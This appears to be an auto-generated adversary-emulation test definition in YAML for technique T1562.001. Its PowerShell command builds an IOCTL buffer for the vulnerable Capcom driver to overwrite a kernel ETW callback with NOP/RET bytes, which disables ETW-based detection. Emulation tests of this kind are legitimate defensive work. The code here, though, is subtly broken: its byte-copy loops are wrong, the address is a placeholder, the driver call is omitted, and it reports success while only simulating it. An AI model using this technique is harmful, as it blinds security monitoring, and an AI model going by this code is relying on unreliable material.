# Auto-generated by CIPHER v5.0
# Source: 18697e54387f
attack_technique: T1562.001
display_name: "T1562.001 - Patch ETW Callback via IOCTL"
atomic_tests:
  - name: "T1562.001 - Patch ETW Callback via IOCTL"
    description: |
      Overwrite EtwTraceCallback with NOP/RET to disable ETW based detection.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $payload = [byte[]](0x90,0xC3)
        $target = 0xFFFFF80001234560 # EtwTraceCallback address (example)
        $inBuf = New-Object byte[] (8+4+$payload.Length)
        [BitConverter]::GetBytes($target) | % { $inBuf[$_] = $_ }
        [BitConverter]::GetBytes($payload.Length) | % { $inBuf[8+$_] = $_ }
        $payload.CopyTo($inBuf,12)
        $h = [System.IO.File]::Open("\\\\.\\Capcom", 'Open', 'ReadWrite', 'None')
        $ioctl = 0x9B0C0010
        # DeviceIoControl call via Add-Type omitted for brevity
        Write-Host "[+] ETW patched (simulated)"
      cleanup_command: |
        # Reboot restores original kernel memory
